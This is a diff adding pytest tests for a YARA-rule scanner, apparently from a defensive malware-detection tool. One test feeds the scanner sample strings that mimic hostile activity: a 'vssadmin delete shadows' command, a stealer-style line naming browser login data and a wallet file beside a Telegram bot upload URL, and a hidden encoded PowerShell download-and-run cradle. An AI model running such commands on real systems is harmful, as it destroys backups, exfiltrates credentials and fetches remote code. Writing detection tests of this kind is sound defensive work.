@@ -80,3 +80,75 @@ def test_clean_system_files_trigger_no_yara():
         p = SYSTEM32 / name
         if p.exists():
             assert yara_scanner.scan_bytes(p.read_bytes(), name) == []
+
+
+# ---------------------------------------------------------------- YARA loader robustness
+import yara_scanner  # noqa: E402
+
+
+@pytest.fixture
+def rules_dir(tmp_path, monkeypatch):
+    d = tmp_path / "rules"
+    d.mkdir()
+    monkeypatch.setattr(yara_scanner, "RULES_DIR", d)
+    monkeypatch.setattr(yara_scanner, "_CACHE_KEY", None)
+    monkeypatch.setattr(yara_scanner, "_CACHE_RULES", None)
+    return d
+
+
+GOOD_RULE = 'rule Good { strings: $a = "EVIL_MARKER_123" condition: $a }\n'
+
+
+@pytest.mark.skipif(yara_scanner._yara is None, reason="yara-python not installed")
+def test_broken_rule_file_is_skipped_not_fatal(rules_dir):
+    (rules_dir / "good.yar").write_text(GOOD_RULE)
+    (rules_dir / "broken.yar").write_text("rule Broken { strings: $a = \"x\" condition: $a and and }\n")
+    st = yara_scanner.rules_status()                      # used by /api/system-status: must not raise
+    assert st["engine"] == "yara-python" and st["rules_count"] == 1
+    assert any("broken.yar" in p for p in st["problems"])
+    assert [m["rule"] for m in yara_scanner.scan_bytes(b"..EVIL_MARKER_123..")] == ["Good"]
+
+
+def test_builtin_engine_skips_unsupported_rules_with_reason(rules_dir, monkeypatch):
+    monkeypatch.setattr(yara_scanner, "_yara", None)
+    (rules_dir / "mixed.yar").write_text(
+        GOOD_RULE
+        + 'rule NeedsFilesize { strings: $a = "MZ" condition: $a and filesize < 100KB }\n'
+        + 'rule HexWildcard { strings: $h = { 4D 5A ?? 00 } condition: $h }\n'
+        + 'rule Regex { strings: $r = /evil[0-9]+/ condition: $r }\n'
+    )
+    st = yara_scanner.rules_status()
+    assert st["engine"] == "builtin" and st["rules_count"] == 1 and st["hint"]
+    skipped = " ".join(st["problems"])
+    for name in ("NeedsFilesize", "HexWildcard", "Regex"):
+        assert name in skipped
+    assert [m["rule"] for m in yara_scanner.scan_bytes(b"MZ\x90\x00 EVIL_MARKER_123 evil42")] == ["Good"]
+
+
+def test_builtin_fullword(rules_dir, monkeypatch):
+    monkeypatch.setattr(yara_scanner, "_yara", None)
+    (rules_dir / "fw.yar").write_text('rule FW { strings: $a = "cmd" fullword condition: $a }\n')
+    assert yara_scanner.scan_bytes(b"run cmd now")
+    assert not yara_scanner.scan_bytes(b"xcmdx")
+
+
+@pytest.mark.skipif(yara_scanner._yara is None, reason="needs yara-python to compare against")
+def test_builtin_engine_agrees_with_yara_python(monkeypatch):
+    """On the bundled rules, the fallback engine must give the same verdicts as real YARA."""
+    samples = [
+        "vssadmin.exe".encode("utf-16le") + b" /quiet delete shadows /all",
+        b"\Google\Chrome\User Data Login Data Local State wallet.dat https://api.telegram.org/bot1:x/sendDocument",
+        b"powershell -WindowStyle Hidden -enc AAAA IEX DownloadString('http://x')",
+        b"VBoxGuest.sys vmtoolsd.exe SbieDll.dll",
+        b"nothing interesting here at all",
+        (SYSTEM32 / "whoami.exe").read_bytes() if (SYSTEM32 / "whoami.exe").exists() else b"MZ",
+    ]
+    def run(engine_off):
+        monkeypatch.setattr(yara_scanner, "_CACHE_KEY", None)
+        if engine_off:
+            monkeypatch.setattr(yara_scanner, "_yara", None)
+        return [sorted(m["rule"] for m in yara_scanner.scan_bytes(s)) for s in samples]
+    real = run(False)
+    builtin = run(True)
+    assert real == builtin, list(zip(real, builtin))
+    assert any(real), "samples should trigger at least one bundled rule"
